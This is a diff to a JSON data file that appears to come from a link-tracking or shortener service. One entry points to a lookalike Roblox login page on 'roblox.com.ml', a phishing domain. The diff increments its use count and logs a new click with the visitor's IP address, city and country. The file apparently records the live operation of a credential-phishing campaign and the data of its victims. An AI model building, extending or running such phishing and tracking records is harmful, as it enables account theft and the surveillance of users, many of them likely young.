@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 452,
+    "useCount": 453,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3723,6 +3723,14 @@
       },
       {
         "timestamp": 1777065302092,
+        "ip": "27.34.67.241",
+        "country": "Nepal",
+        "city": "Kathmandu",
+        "flag": "🇳🇵",
+        "countryCode": "NP"
+      },
+      {
+        "timestamp": 1777065320027,
         "ip": "27.34.67.241",
         "country": "Nepal",
         "city": "Kathmandu",
